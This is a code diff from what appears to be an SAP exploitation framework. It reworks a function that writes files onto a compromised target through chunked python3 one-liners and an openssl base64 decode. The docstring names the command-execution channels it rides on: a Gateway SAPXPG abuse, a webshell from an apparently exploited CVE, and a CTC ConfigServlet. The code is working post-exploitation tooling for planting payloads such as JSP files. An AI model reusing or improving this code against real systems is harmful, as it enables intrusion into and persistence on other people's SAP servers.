@@ -101,37 +101,65 @@ _DUMP_ATTEMPTS = [
 def _write_remote_file(run_cmd: Callable[[str, str], dict],
                           path: str, content: str,
                           log=print,
-                          chunk_size: int = 150) -> bool:
+                          chunk_size: int = 180) -> bool:
     """Write a UTF-8 text file to the target via chunked python3
-    one-liners.  Reuses the exact pattern _deploy_jsp_via_gw uses so
-    it works through every run_cmd primitive (GW SAPXPG → CVE-31324
-    webshell → CTC ConfigServlet).
+    one-liners followed by an openssl decode.  Same proven primitive
+    _deploy_jsp_via_gw uses — appends raw base64 *text* per chunk
+    then decodes the whole concatenated blob in one openssl call.
 
-    Returns True on success.  Each chunk's command stays ≤ 255 bytes
-    so it fits in SAPXPG's PARAMS field when that's the transport.
+    An earlier version called ``base64.b64decode(chunk)`` per chunk,
+    which silently produced garbage whenever ``chunk_size`` wasn't a
+    multiple of 4 (base64's group size) — only the final-chunk bytes
+    survived on disk.  Always write base64 as text here, let openssl
+    decode the whole thing at the end.
+
+    Returns True on success.  The tmp-base64 file lives at
+    ``<path>.b64`` and is removed after successful decode.
     """
     import base64
     b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
     n_chunks = (len(b64) + chunk_size - 1) // chunk_size
-    log(f"[*] configtool: uploading wrapper in {n_chunks} × "
-        f"{chunk_size}-byte base64 chunks …")
+    tmp_b64 = f"{path}.b64"
+    log(f"[*] configtool: uploading {len(content)} B content as "
+        f"{n_chunks} × {chunk_size}-char base64 chunks → {tmp_b64}")
+    # Clean any stale tmp
+    run_cmd("/bin/rm", f"-f {tmp_b64}")
     for i in range(0, len(b64), chunk_size):
         chunk = b64[i:i + chunk_size]
         mode = "wb" if i == 0 else "ab"
-        script = (f"open('{path}','{mode}').write("
-                   f"__import__('base64').b64decode(b'{chunk}'))")
+        # NOTE: we write the base64 TEXT (as bytes) to a tmp file.
+        # No per-chunk decode — avoids the 4-byte alignment trap.
+        script = f"open('{tmp_b64}','{mode}').write(b'{chunk}')"
         r = run_cmd("python3", f"-c {script}")
         if not r.get("success"):
             log(f"[-] configtool: chunk {(i // chunk_size) + 1}/{n_chunks} "
                 f"write failed")
             return False
-    # Sanity-check the file size matches what we encoded (raw bytes =
-    # decoded length).
+    # Decode once: openssl enc -d -base64 -A -in <tmp> -out <path>.
+    # -A tells openssl to accept single-line base64 (no PEM line breaks).
+    dec = run_cmd("/usr/bin/openssl",
+                    f"enc -d -base64 -A -in {tmp_b64} -out {path}")
+    dec_out = " ".join(str(l) for l in (dec.get("output") or [])).strip()
+    if not dec.get("success") or any(m in dec_out.lower()
+                                       for m in ("error", "unable",
+                                                   "no such")):
+        log(f"[-] configtool: openssl decode failed: {dec_out[:200]}")
+        run_cmd("/bin/rm", f"-f {tmp_b64}")
+        return False
+    run_cmd("/bin/rm", f"-f {tmp_b64}")
+    # Sanity-check the final file size.
     st = run_cmd("/usr/bin/stat", f"-c %s {path}")
     st_out = " ".join(str(l) for l in (st.get("output") or [])).strip()
+    try:
+        landed = int(st_out.split()[0])
+    except Exception:
+        landed = 0
     log(f"[+] configtool: {path} size on target: "
-        f"{st_out or '<no stat>'} (expected {len(b64)} base64 B "
-        f"pre-decode, or ~{len(content)} final)")
+        f"{st_out or '<no stat>'} (expected {len(content)} bytes)")
+    if landed and landed < len(content) // 2:
+        log(f"[!] configtool: only {landed} of {len(content)} expected "
+            f"bytes landed — upload truncated.")
+        return False
     return True
 
 
